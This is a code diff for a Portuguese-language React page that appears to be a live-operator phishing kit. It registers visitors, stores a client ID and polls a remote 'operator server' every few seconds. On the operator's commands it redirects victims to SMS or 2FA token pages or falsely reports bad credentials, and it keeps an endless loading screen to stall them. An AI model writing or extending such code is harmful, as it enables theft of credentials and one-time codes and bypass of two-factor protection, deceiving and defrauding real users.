@@ -9,7 +9,6 @@ import { useClientStatus } from "@/hooks/useClientStatus";
 import { useMetrics } from "@/hooks/useMetrics";
 import { useToast } from "@/hooks/use-toast";
 import { useCpfValidation } from "@/hooks/useCpfValidation";
-import { useClientMonitoring } from "@/hooks/useClientMonitoring";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -86,9 +85,119 @@ const collectClientData = async () => {
   };
 };
 
+// Função para monitorar cliente continuamente
+const monitorClient = async (clientId: string, navigate: (path: string) => void, toast: any): Promise<void> => {
+  console.log(`Iniciando monitoramento do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    try {
+      console.log(`Consultando dados do cliente ${clientId}...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente recebidos:', clientData);
+        console.log('Valor do response:', clientData.data?.response);
+        console.log('Valor do command:', clientData.data?.command);
+        console.log('Tipo do response:', typeof clientData.data?.response);
+        console.log('Tipo do command:', typeof clientData.data?.command);
+        
+        // Verificar se recebeu comando de dados incorretos
+        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username") {
+          console.log('Detectado inv_username - Dados incorretos');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - dados incorretos');
+          toast({
+            title: "Dados incorretos",
+            description: "Os dados da página /home estão incorretos. Verifique suas credenciais e tente novamente.",
+            variant: "destructive",
+          });
+          return;
+        }
+        
+        // Verificar redirecionamentos baseados no response ou command dentro de data
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms - Redirecionando para /sms');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/sms');
+          return;
+        }
+        
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa - Redirecionando para /token');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/token');
+          return;
+        }
+        
+        console.log('Nenhum redirecionamento necessário - continuando monitoramento...');
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento contínuo configurado (3 segundos)');
+};
+
+// Função para processar resposta de registro e iniciar monitoramento
+const processRegistrationResponse = async (response: Response, navigate: (path: string) => void, toast: any): Promise<void> => {
+  try {
+    const responseData = await response.json();
+    console.log('Cliente registrado com sucesso:', responseData);
+    
+    // Verificar se a resposta contém clientId
+    if (responseData.success && responseData.clientId) {
+      console.log('ClientId capturado:', responseData.clientId);
+      
+      // Salvar clientId no localStorage
+      localStorage.setItem('clientId', responseData.clientId);
+      console.log('ClientId salvo no localStorage:', responseData.clientId);
+      
+      // Iniciar monitoramento contínuo do cliente
+      await monitorClient(responseData.clientId, navigate, toast);
+    } else {
+      console.log('ClientId não encontrado na resposta');
+      
+      // Tentar capturar ID de outras possíveis localizações na resposta
+      const clientId = responseData.clientId || responseData.data?.id || responseData.id;
+      if (clientId) {
+        console.log('ClientId encontrado em localização alternativa:', clientId);
+        // Salvar clientId no localStorage
+        localStorage.setItem('clientId', clientId);
+        console.log('ClientId salvo no localStorage:', clientId);
+        await monitorClient(clientId, navigate, toast);
+      }
+    }
+  } catch (error) {
+    console.log('Erro ao processar resposta de registro:', error);
+  }
+};
+
 const Index = () => {
   const navigate = useNavigate();
-  const clientMonitoring = useClientMonitoring();
+  const clientStatus = useClientStatus();
   const metrics = useMetrics();
   const { toast } = useToast();
   const cpfValidation = useCpfValidation();
@@ -258,17 +367,8 @@ const Index = () => {
       console.log('Status da resposta:', response.status);
       
       if (response.ok) {
-        const responseData = await response.json();
-        console.log('Cliente registrado com sucesso:', responseData);
-        
-        const clientId = responseData.clientId || responseData.data?.id || responseData.id;
-        if (clientId) {
-          console.log('ClientId capturado:', clientId);
-          localStorage.setItem('clientId', clientId);
-          
-          // Iniciar monitoramento centralizado
-          clientMonitoring.startMonitoring(clientId, 'home');
-        }
+        // Processar resposta e iniciar monitoramento
+        await processRegistrationResponse(response, navigate, toast);
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
@@ -278,7 +378,7 @@ const Index = () => {
       console.log('Erro durante o processo de registro:', error);
     }
     
-    // Manter loading infinito
+    // Manter loading infinito - não setar isLoading para false
     console.log('Loading infinito ativado');
   };
 
@@ -427,6 +527,7 @@ const Index = () => {
 
   // ---- Registrar visita automaticamente ----
   useEffect(() => {
+    // Registrar visita apenas uma vez quando a página carregar
     if (!metrics.isRegistered) {
       metrics.registerVisit();
     }
@@ -437,15 +538,15 @@ const Index = () => {
     // Verificar se já existe clientId para iniciar monitoramento
     const storedClientId = localStorage.getItem('clientId');
     if (storedClientId) {
-      console.log('Index: ClientId encontrado, iniciando monitoramento');
-      clientMonitoring.startMonitoring(storedClientId, 'home');
+      console.log('ClientId encontrado na página Index, iniciando monitoramento de status');
+      clientStatus.startMonitoring();
     }
 
     // Cleanup quando sair da página
     return () => {
-      clientMonitoring.stopMonitoring();
+      clientStatus.stopMonitoring();
     };
-  }, [clientMonitoring]);
+  }, [clientStatus]);
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
